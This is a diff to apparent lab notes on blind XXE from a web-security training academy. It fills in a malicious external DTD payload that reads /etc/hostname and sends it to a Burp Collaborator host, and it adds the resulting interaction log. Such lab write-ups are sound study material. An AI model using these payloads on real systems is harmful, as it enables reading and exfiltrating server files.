@@ -65,12 +65,10 @@ Read value from avatar image
 ```
 
 ### Exploiting blind XXE to exfiltrate data using a malicious external DTD
-TODO: Burp Suite Professional
-
 Exploit hosted at https://ac951f351fa00e4680194cf5014e0008.web-security-academy.net/exploit
 ```
 <!ENTITY % file SYSTEM "file:///etc/hostname">
-<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://suq7(...).burpcollaborator.net/?x=%file;'>">
 %eval;
 %exfiltrate; 
 ```
@@ -79,6 +77,8 @@ Modified HTTP request body
 ```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "https://ac951f351fa00e4680194cf5014e0008.web-security-academy.net/exploit"> %xxe;]>
 ```
+
+Burp Collaborator interaction: `GET /?x=64417c38891c HTTP/1.1`
 
 ### Exploiting blind XXE to retrieve data via error messages
 Exploit hosted at https://ac381fd11f83c251800a4f4901dc00aa.web-security-academy.net/
